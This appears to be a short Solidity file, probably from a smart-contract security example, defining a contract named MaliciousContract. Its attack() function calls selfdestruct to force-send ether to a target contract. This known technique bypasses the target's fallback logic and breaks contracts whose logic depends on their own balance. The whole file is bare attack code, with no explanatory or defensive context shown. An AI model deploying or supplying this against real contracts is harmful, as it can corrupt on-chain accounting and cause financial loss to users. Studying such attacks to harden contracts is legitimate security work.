// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract MaliciousContract {
    function attack(address payable _vulnerableSc) public payable {
        selfdestruct(_vulnerableSc);
    }
}
